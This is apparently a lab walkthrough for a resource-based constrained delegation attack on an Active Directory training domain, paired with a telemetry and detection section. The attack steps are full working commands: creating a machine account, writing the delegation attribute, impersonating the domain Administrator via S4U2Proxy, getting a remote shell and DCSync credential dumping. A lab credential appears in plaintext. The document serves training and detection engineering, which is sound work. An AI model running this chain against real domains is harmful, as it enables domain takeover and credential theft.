# WT#007 — Resource-Based Constrained Delegation (RBCD)

## Metadata
| Field | Value |
|-------|-------|
| **Target VM** | 192.168.77.22 (mbr01) |
| **Domain** | child.cadre.local |
| **Starting Credential** | analyst_t1 / T13r_An@lyst! |
| **Tools Required** | bloodyAD, Rubeus, impacket-getST |
| **Certifications** | CRTE, CAPE |
| **MITRE ATT&CK** | T1550.003 |
| **Difficulty** | Medium |

## Prerequisites
- analyst_t1 has WriteProperty on mbr01$ for `msDS-AllowedToActOnBehalfOfOtherIdentity`
- Ability to create a computer account or control an existing computer object
- Default domain quota: domain users can create up to 10 computer accounts

## Attack Steps

### Step 1 — Create a controlled computer account
```bash
# From kali, use bloodyAD or impacket to create a new machine account
# Using analyst_t1 credentials against child domain DC (dc02)

# Create computer account using impacket
impacket-addcomputer child.cadre.local/analyst_t1:'T13r_An@lyst!' -method SAMR -computer-name ATTACKER$ -computer-pass Att@ck3rP@ss!

# Verify the computer was created
bloodyAD --host dc02.child.cadre.local -d child.cadre.local -u analyst_t1 -p 'T13r_An@lyst!' get object 'CN=ATTACKER,CN=Computers,DC=child,DC=cadre,DC=local'
```

### Step 2 — Write msDS-AllowedToActOnBehalfOfOtherIdentity on mbr01$
```bash
# Use bloodyAD to set RBCD on mbr01$ allowing ATTACKER$ to delegate
bloodyAD --host dc02.child.cadre.local -d child.cadre.local -u analyst_t1 -p 'T13r_An@lyst!' set rbcd 'CN=mbr01,CN=Computers,DC=child,DC=cadre,DC=local' 'CN=ATTACKER,CN=Computers,DC=child,DC=cadre,DC=local'

# Verify RBCD was set
bloodyAD --host dc02.child.cadre.local -d child.cadre.local -u analyst_t1 -p 'T13r_An@lyst!' get rbcd 'CN=mbr01,CN=Computers,DC=child,DC=cadre,DC=local'
```

### Step 3 — S4U2Proxy to request service ticket as DA
```bash
# Obtain TGT for ATTACKER$
impacket-getTGT 'child.cadre.local/ATTACKER$:Att@ck3rP@ss!' -dc-ip 192.168.77.11
export KRB5CCNAME=/tmp/attacker.ccache

# Request service ticket to cifs/mbr01 as child domain Administrator
impacket-getST -spn cifs/mbr01.child.cadre.local -impersonate Administrator -dc-ip 192.168.77.11 'child.cadre.local/ATTACKER$:Att@ck3rP@ss!'

# Alternative: use Rubeus on a Windows machine
Rubeus.exe s4u /user:ATTACKER$ /rc4:<attacker_ntlm> /impersonateuser:Administrator /domain:child.cadre.local /msdsspn:cifs/mbr01.child.cadre.local /dc:dc02.child.cadre.local /ptt
```

### Step 4 — Access mbr01 as DA
```bash
export KRB5CCNAME=/tmp/administrator.ccache

# Access CIFS on mbr01
impacket-smbexec -no-pass -k administrator@mbr01.child.cadre.local

# DCSync from dc02 using child domain DA
impacket-secretsdump -no-pass -k administrator@dc02.child.cadre.local
```

## Post-Exploitation Chain
WT#007 → DA on child.cadre.local → DCSync child domain → SID History injection → cadre.local parent domain compromise

## Telemetry Verification
- **Elastic Index:** `logs-system.security-*`, `logs-windows.sysmon_operational-*`
- **Expected Events:**
  - Event ID 4742: Computer account attribute modification (ATTACKER$ created)
  - Event ID 5136: Directory service object modification (msDS-AllowedToActOnBehalfOfOtherIdentity written)
  - Event ID 4624: Logon as Administrator with delegation token
  - Event ID 4769: S4U2Proxy TGS request with cifs/mbr01
  - Sysmon EID 1: powershell.exe, bloodyAD.exe, Rubeus.exe
- **Zeek:** `kerberos.log` with S4U2Proxy TGS-REQ showing FORWARDED ticket flag
- **Attack detection note:** RBCD writes produce 5136 events on the target computer object in AD — correlate with event.code:5136 AND ObjectDN contains "mbr01" AND Attribute contains "AllowedToAct"
- **Defender view:** the high-fidelity signal is the **5136 write to `msDS-AllowedToActOnBehalfOfOtherIdentity`** followed minutes later by a 4769 S4U2Proxy for a privileged user — that pairing is almost never legitimate. A freshly-created computer account (4741) writing that attribute is the smoking gun.

**Alternative paths:** if you can't add a computer account (ms-DS-MachineAccountQuota = 0), reuse an existing controlled computer/gMSA; or chain from Shadow Credentials (WT#008) instead of creating ATTACKER$.

## Status
CONFIGURED
